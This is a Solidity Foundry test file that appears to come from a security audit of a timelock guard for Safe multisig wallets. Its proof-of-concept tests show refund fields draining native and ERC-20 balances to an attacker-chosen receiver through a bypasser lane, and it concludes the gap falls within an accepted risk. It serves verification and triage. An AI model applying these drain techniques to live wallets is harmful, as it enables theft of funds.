// SPDX-License-Identifier: MIT
// Prompt C priority lead 3: T-BYPASS-7 / the C1 refund fix, replayed on the INLINE
// bypasser lane instead of the management meta-call lane.
//
// docs/V1_USER_SCENARIOS.md:930-934 records T-BYPASS-7 as "ON-CHAIN FIXED ... a coerced
// quorum cannot drain the Safe via gasToken/refundReceiver while sidestepping the
// timelock". The fix is `TimelockBypassRefundDenied` (INV-TIME-9), which lives only in
// the `_isTimelockManagementCall` branch (src/LockdownTimelock.sol:186-190).
//
// `src/LockdownTimelock.sol:201` and `:212` implement a SECOND, separate no-ticket lane:
// when the submitter (`msgSender`) is an allowlisted bypasser the delay is skipped
// inline, and a code comment at `:196-200` states this lane deliberately does NOT
// re-check refund fields. `:212` (the DELEGATECALL half) was the surviving mutant T5 of
// the Prompt D campaign, i.e. it has no test coverage at all.
//
// These tests settle by execution whether refund draining is reachable on the inline
// lane, on BOTH the CALL and DELEGATECALL branches.
pragma solidity ^0.8.24;

import {TestEnvironment} from "../TestEnvironment.sol";

import {Safe, Enum} from "@safe-global/safe-smart-account/Safe.sol";
import {MultiSendCallOnly} from "@safe-global/safe-smart-account/libraries/MultiSendCallOnly.sol";

import {LockdownTimelock} from "../../src/LockdownTimelock.sol";
import {Timelock} from "../../src/base/Timelock.sol";

/// @dev Minimal ERC-20 used as a Safe `gasToken`. The ERC-20 refund branch of
///      `Safe.handlePayment` is NOT capped by `tx.gasprice`, unlike the native branch,
///      so it is the drain primitive the C1 fix was actually written against.
contract GasToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        require(balanceOf[msg.sender] >= amount, "balance");
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract TimelockBypassRefundLanePoC is TestEnvironment {
    uint64 private constant DELAY = 24 hours;
    address private constant HSM = address(0x4534);
    address payable private constant REFUND_RECEIVER = payable(address(0xFEE5));
    address private constant TARGET = address(0x7A6E7);

    Safe private safe;
    GasToken private gasToken;

    function setUp() public override {
        super.setUp();

        safe = _createConfigureAndInitialise(93);
        vm.deal(address(safe), 100 ether);
        gasToken = new GasToken();
        gasToken.mint(address(safe), 1_000_000 ether);

        // Safe v1.5.0 caps a NATIVE refund at min(gasPrice, tx.gasprice); Foundry
        // defaults tx.gasprice to 0, which would mask the payout for environment
        // reasons rather than contract reasons. Set a realistic tx gas price.
        vm.txGasPrice(50 gwei);

        // Register the bypasser BEFORE enabling the timelock so its own self-call is
        // not itself timelocked (the documented operator ordering).
        _execAsOwner(
            safe,
            address(guard),
            0,
            abi.encodeCall(LockdownTimelock.setTimelockBypasser, (HSM, true)),
            Enum.Operation.Call
        );
        _enableTimelock(safe, DELAY);
    }

    function _signWithRefund(address to, bytes memory data, Enum.Operation op, uint256 gasPrice)
        private
        view
        returns (bytes memory)
    {
        return _signWithRefund(to, data, op, gasPrice, address(0));
    }

    function _signWithRefund(address to, bytes memory data, Enum.Operation op, uint256 gasPrice, address token)
        private
        view
        returns (bytes memory)
    {
        bytes32 h = safe.getTransactionHash(to, 0, data, op, 0, 100_000, gasPrice, token, REFUND_RECEIVER, safe.nonce());
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(OWNER_PK, h);
        return abi.encodePacked(r, s, v);
    }

    // -------------------------------------------------------------------
    // Control: the C1 fix really does work on the lane it covers
    // -------------------------------------------------------------------

    /// @dev The management meta-call lane rejects refund fields. This is INV-TIME-9 and
    ///      it is the lane the C1 fix was written for.
    function test_control_metaCallLaneRejectsRefundFields() public {
        bytes memory data = abi.encodeCall(LockdownTimelock.cancelTransaction, (bytes32(uint256(1))));
        bytes memory sig = _signWithRefund(address(guard), data, Enum.Operation.Call, 1);
        vm.expectRevert(LockdownTimelock.TimelockBypassRefundDenied.selector);
        safe.execTransaction(
            address(guard), 0, data, Enum.Operation.Call, 0, 100_000, 1, address(0), REFUND_RECEIVER, sig
        );
    }

    // -------------------------------------------------------------------
    // Lead 3 - the inline bypasser lane, CALL branch
    // -------------------------------------------------------------------

    /// @dev CONFIRMED: with the bypasser as submitter, an unscheduled owner-path tx
    ///      carrying non-zero refund fields executes immediately - no ticket, no delay,
    ///      and `TimelockBypassRefundDenied` never fires. The Safe pays out to an
    ///      attacker-chosen `refundReceiver`.
    function test_confirmed_inlineBypasserLaneCallSkipsRefundGate() public {
        uint256 gasPrice = 20 gwei;
        bytes memory sig = _signWithRefund(TARGET, hex"", Enum.Operation.Call, gasPrice);

        assertEq(REFUND_RECEIVER.balance, 0, "refund receiver starts empty");
        uint256 safeBefore = address(safe).balance;

        vm.prank(HSM);
        safe.execTransaction(
            TARGET, 0, hex"", Enum.Operation.Call, 0, 100_000, gasPrice, address(0), REFUND_RECEIVER, sig
        );

        assertGt(REFUND_RECEIVER.balance, 0, "Safe paid a refund on the inline bypasser lane");
        assertLt(address(safe).balance, safeBefore, "Safe balance decreased");
    }

    /// @dev The same transaction from a NON-bypasser submitter is stopped by the
    ///      timelock, so the refund payout above is attributable to the inline lane and
    ///      not to some unrelated gap.
    function test_control_sameRefundTxFromNonBypasserIsTimelocked() public {
        uint256 gasPrice = 20 gwei;
        bytes memory sig = _signWithRefund(TARGET, hex"", Enum.Operation.Call, gasPrice);

        vm.prank(other);
        vm.expectRevert(Timelock.TicketNotFound.selector);
        safe.execTransaction(
            TARGET, 0, hex"", Enum.Operation.Call, 0, 100_000, gasPrice, address(0), REFUND_RECEIVER, sig
        );
        assertEq(REFUND_RECEIVER.balance, 0, "no refund without the bypasser");
    }

    // -------------------------------------------------------------------
    // Lead 3 - the inline bypasser lane, DELEGATECALL branch (mutant T5)
    // -------------------------------------------------------------------

    /// @dev CONFIRMED on the branch that had zero coverage: a MultiSend bundle
    ///      delegatecalled by the bypasser skips the timelock inline and carries refund
    ///      fields. `src/LockdownTimelock.sol:212` is the only line gating this.
    function test_confirmed_inlineBypasserLaneDelegateCallSkipsTimelockAndRefundGate() public {
        bytes memory batch = abi.encodePacked(_multiSendItem(Enum.Operation.Call, TARGET, 0, hex""));
        bytes memory payload = abi.encodeCall(MultiSendCallOnly.multiSend, (batch));
        uint256 gasPrice = 20 gwei;
        bytes memory sig = _signWithRefund(address(multiSendCallOnly), payload, Enum.Operation.DelegateCall, gasPrice);

        assertEq(REFUND_RECEIVER.balance, 0, "refund receiver starts empty");

        vm.prank(HSM);
        safe.execTransaction(
            address(multiSendCallOnly),
            0,
            payload,
            Enum.Operation.DelegateCall,
            0,
            100_000,
            gasPrice,
            address(0),
            REFUND_RECEIVER,
            sig
        );

        assertGt(REFUND_RECEIVER.balance, 0, "Safe paid a refund on the DELEGATECALL inline lane");
    }

    /// @dev The DELEGATECALL branch control: without the bypasser the bundle is
    ///      timelocked. This is the assertion the surviving mutant T5 was missing.
    function test_control_delegateCallBundleFromNonBypasserIsTimelocked() public {
        bytes memory batch = abi.encodePacked(_multiSendItem(Enum.Operation.Call, TARGET, 0, hex""));
        bytes memory payload = abi.encodeCall(MultiSendCallOnly.multiSend, (batch));
        bytes memory sig = _signWithRefund(address(multiSendCallOnly), payload, Enum.Operation.DelegateCall, 0);

        vm.prank(other);
        vm.expectRevert(Timelock.TicketNotFound.selector);
        safe.execTransaction(
            address(multiSendCallOnly),
            0,
            payload,
            Enum.Operation.DelegateCall,
            0,
            100_000,
            0,
            address(0),
            REFUND_RECEIVER,
            sig
        );
    }

    /// @dev The uncapped variant, and the one C1 was written against: an ERC-20
    ///      `gasToken` refund. `Safe.handlePayment`'s token branch multiplies
    ///      `(gasUsed + baseGas) * gasPrice` with NO `tx.gasprice` cap, so the caller
    ///      chooses the payout size. On the inline bypasser lane it is not gated.
    function test_confirmed_inlineBypasserLaneGasTokenRefundIsUncapped() public {
        uint256 gasPrice = 1_000_000 ether / 200_000; // (gasUsed + baseGas) is ~<200k
        bytes memory sig = _signWithRefund(TARGET, hex"", Enum.Operation.Call, gasPrice, address(gasToken));

        assertEq(gasToken.balanceOf(REFUND_RECEIVER), 0, "refund receiver starts empty");
        uint256 safeBefore = gasToken.balanceOf(address(safe));

        vm.prank(HSM);
        safe.execTransaction(
            TARGET, 0, hex"", Enum.Operation.Call, 0, 100_000, gasPrice, address(gasToken), REFUND_RECEIVER, sig
        );

        assertGt(gasToken.balanceOf(REFUND_RECEIVER), 0, "gasToken drained to refundReceiver");
        assertLt(gasToken.balanceOf(address(safe)), safeBefore, "Safe token balance decreased");
    }

    // -------------------------------------------------------------------
    // Is it an ESCALATION, or dominated by accepted risk #8?
    // -------------------------------------------------------------------

    /// @dev The decisive question for triage. A bypasser can already pre-bypass ANY
    ///      hash, including a plain value transfer, and the quorum then executes it
    ///      with no delay. So the refund lane grants no capability the bypasser did not
    ///      already have: this test moves 1 ether to an arbitrary third party using
    ///      only `bypassTimelock`, with all refund fields zero.
    ///
    ///      Conclusion: the inline refund gap is a DOCUMENTATION scope error in
    ///      T-BYPASS-7, dominated by accepted risk #8 ("HSM compromise = full
    ///      owner-path bypass authority"), NOT a new drain primitive.
    function test_refuted_refundLaneIsNotAnEscalationBeyondAcceptedRisk8() public {
        bytes32 h = _safeTxHash(safe, TARGET, 1 ether, hex"", Enum.Operation.Call);
        vm.prank(HSM);
        guard.bypassTimelock(address(safe), h);

        uint256 before = TARGET.balance;
        _execAsOwner(safe, TARGET, 1 ether, hex"", Enum.Operation.Call);
        assertEq(TARGET.balance, before + 1 ether, "plain transfer already drains with zero refund fields");
    }
}
